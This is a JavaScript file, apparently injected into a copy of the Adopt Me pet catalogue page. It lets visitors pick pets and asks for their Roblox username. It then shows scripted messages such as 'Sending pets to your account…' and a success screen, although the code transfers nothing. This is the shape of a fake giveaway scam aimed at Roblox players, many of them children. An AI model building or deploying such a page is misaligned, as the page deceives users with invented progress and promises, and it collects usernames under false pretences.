(function () {
  var BAR_ID = "pet-get-bar";
  var selected = new Map();

  function getPetsGrid() {
    return document.querySelector(".css-rcfp4r.e5r9u4y0") || document.querySelector(".css-rcfp4r");
  }

  function slugFromHref(href) {
    try {
      var u = href.split("?")[0].replace(/\/$/, "");
      return decodeURIComponent(u.split("/").pop() || "");
    } catch (e) {
      return href;
    }
  }

  function imageFromAnchor(anchor) {
    var im =
      anchor.querySelector("img.e12aqbjs2") ||
      anchor.querySelector("img.css-0.e12aqbjs2") ||
      anchor.querySelector('img[src*="pets/items"]');
    if (!im) return "";
    var src = im.getAttribute("src") || "";
    if (!src || src.indexOf("data:") === 0) return "";
    return src;
  }

  function updateBar() {
    var bar = document.getElementById(BAR_ID);
    var countEl = document.getElementById("pet-get-count");
    var btn = document.getElementById("pet-get-btn");
    if (!bar || !countEl || !btn) return;
    var n = selected.size;
    countEl.textContent = n === 1 ? "1 pet selected" : n + " pets selected";
    bar.hidden = n === 0;
    btn.disabled = n === 0;
  }

  function toggleCard(anchor) {
    var slug = anchor.getAttribute("data-pet-slug");
    if (!slug) return;
    var name =
      anchor.getAttribute("data-pet-name") ||
      (anchor.querySelector("h2") && anchor.querySelector("h2").textContent.trim()) ||
      slug;
    if (selected.has(slug)) {
      selected.delete(slug);
      anchor.classList.remove("is-selected");
      anchor.setAttribute("aria-pressed", "false");
    } else {
      var img = anchor.getAttribute("data-pet-img") || imageFromAnchor(anchor);
      selected.set(slug, { name: name, slug: slug, img: img });
      anchor.classList.add("is-selected");
      anchor.setAttribute("aria-pressed", "true");
    }
    updateBar();
  }

  function onPetClick(e) {
    if (e.defaultPrevented) return;
    e.preventDefault();
    toggleCard(e.currentTarget);
  }

  function onPetKey(e) {
    if (e.key !== "Enter" && e.key !== " ") return;
    e.preventDefault();
    toggleCard(e.currentTarget);
  }

  function wireCards() {
    var links = document.querySelectorAll(
      'main a[href*="playadopt.me/discover/pets/"]'
    );
    links.forEach(function (a) {
      a.classList.add("pet-card-selectable");
      var slug = slugFromHref(a.getAttribute("href") || "");
      var h2 = a.querySelector("h2");
      var name = h2 ? h2.textContent.trim() : slug;
      a.setAttribute("data-pet-slug", slug);
      a.setAttribute("data-pet-name", name);
      var pic = imageFromAnchor(a);
      if (pic) a.setAttribute("data-pet-img", pic);
      a.setAttribute("role", "button");
      a.setAttribute("aria-pressed", "false");
      a.setAttribute("tabindex", "0");
      a.removeAttribute("target");
      a.addEventListener("click", onPetClick);
      a.addEventListener("keydown", onPetKey);
    });
  }

  function buildChrome() {
    if (document.getElementById(BAR_ID)) return;

    var bar = document.createElement("div");
    bar.id = BAR_ID;
    bar.className = "pet-get-bar";
    bar.hidden = true;
    bar.innerHTML =
      '<div class="pet-get-bar-inner">' +
      '<span id="pet-get-count" class="pet-get-count">0 pets selected</span>' +
      '<button type="button" id="pet-get-btn" class="pet-get-btn" disabled>Get</button>' +
      "</div>";
    document.body.appendChild(bar);

    var backdrop = document.createElement("div");
    backdrop.id = "pet-modal-root";
    backdrop.className = "pet-modal-root";
    backdrop.innerHTML =
      '<div class="pet-modal-backdrop" data-close="1"></div>' +
      '<div class="pet-modal pet-modal--form" id="pet-modal-form" role="dialog" aria-modal="true" aria-labelledby="pet-modal-form-title" hidden>' +
      '<h2 id="pet-modal-form-title" class="pet-modal-title">Almost there</h2>' +
      '<p class="pet-modal-sub">These pets will be sent to your account:</p>' +
      '<ul id="pet-modal-list" class="pet-modal-list"></ul>' +
      '<label class="pet-modal-label" for="pet-nickname">Roblox username</label>' +
      '<input type="text" id="pet-nickname" class="pet-modal-input" autocomplete="username" placeholder="Enter your nickname" />' +
      '<button type="button" id="pet-done-btn" class="pet-modal-primary">Done</button>' +
      "</div>" +
      '<div class="pet-modal pet-modal--loading" id="pet-modal-loading" role="dialog" aria-modal="true" aria-live="polite" hidden>' +
      '<div class="pet-loading-spinner" aria-hidden="true"></div>' +
      '<p id="pet-loading-text" class="pet-loading-text">Connecting…</p>' +
      "</div>" +
      '<div class="pet-modal pet-modal--success" id="pet-modal-success" role="dialog" aria-modal="true" hidden>' +
      '<div class="pet-success-check" aria-hidden="true">✓</div>' +
      '<h2 class="pet-modal-title">All set!</h2>' +
      '<p class="pet-modal-sub">Your pets are on the way to your account.</p>' +
      '<button type="button" id="pet-success-close" class="pet-modal-primary">Close</button>' +
      "</div>";
    document.body.appendChild(backdrop);

    document.getElementById("pet-get-btn").addEventListener("click", openFormModal);
    document.getElementById("pet-done-btn").addEventListener("click", onDone);
    document.getElementById("pet-success-close").addEventListener("click", closeAllModals);
    backdrop.querySelector(".pet-modal-backdrop").addEventListener("click", function (e) {
      if (e.target.dataset.close) {
        var form = document.getElementById("pet-modal-form");
        if (form && !form.hidden) closeFormOnly();
      }
    });
  }

  function openFormModal() {
    var form = document.getElementById("pet-modal-form");
    var list = document.getElementById("pet-modal-list");
    var root = document.getElementById("pet-modal-root");
    if (!form || !list || !root) return;
    list.innerHTML = "";
    selected.forEach(function (p) {
      var li = document.createElement("li");
      li.className = "pet-modal-list-item";
      if (p.img) {
        var thumb = document.createElement("img");
        thumb.className = "pet-modal-list-thumb";
        thumb.src = p.img;
        thumb.alt = "";
        thumb.decoding = "async";
        thumb.loading = "lazy";
        li.appendChild(thumb);
      } else {
        var ph = document.createElement("div");
        ph.className = "pet-modal-list-thumb pet-modal-list-thumb--empty";
        ph.setAttribute("aria-hidden", "true");
        li.appendChild(ph);
      }
      var label = document.createElement("span");
      label.className = "pet-modal-list-name";
      label.textContent = p.name;
      li.appendChild(label);
      list.appendChild(li);
    });
    document.getElementById("pet-nickname").value = "";
    root.classList.add("is-open");
    form.hidden = false;
    document.getElementById("pet-modal-loading").hidden = true;
    document.getElementById("pet-modal-success").hidden = true;
    document.getElementById("pet-nickname").focus();
  }

  function closeFormOnly() {
    var root = document.getElementById("pet-modal-root");
    var form = document.getElementById("pet-modal-form");
    if (root) root.classList.remove("is-open");
    if (form) form.hidden = true;
  }

  function closeAllModals() {
    var root = document.getElementById("pet-modal-root");
    if (root) {
      root.classList.remove("is-open");
      ["pet-modal-form", "pet-modal-loading", "pet-modal-success"].forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.hidden = true;
      });
    }
  }

  var LOADING_LINES = [
    "Connecting to Adopt Me…",
    "Preparing your pets for transfer…",
    "Syncing with Roblox…",
    "Sending pets to your account…",
    "Verifying delivery…",
    "Almost done — your pets are joining your account…",
  ];

  function onDone() {
    var input = document.getElementById("pet-nickname");
    var nick = input && input.value.trim();
    if (!nick || nick.length < 2) {
      input.focus();
      input.classList.add("pet-input-error");
      setTimeout(function () {
        input.classList.remove("pet-input-error");
      }, 800);
      return;
    }

    var form = document.getElementById("pet-modal-form");
    var loading = document.getElementById("pet-modal-loading");
    var success = document.getElementById("pet-modal-success");
    var textEl = document.getElementById("pet-loading-text");
    if (form) form.hidden = true;
    if (loading) loading.hidden = false;

    var i = 0;
    function tick() {
      if (textEl && i < LOADING_LINES.length) {
        textEl.textContent = LOADING_LINES[i];
        i++;
        setTimeout(tick, 1800);
      } else {
        if (loading) loading.hidden = true;
        if (success) success.hidden = false;
      }
    }
    tick();
  }

  function init() {
    buildChrome();
    wireCards();
    updateBar();
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
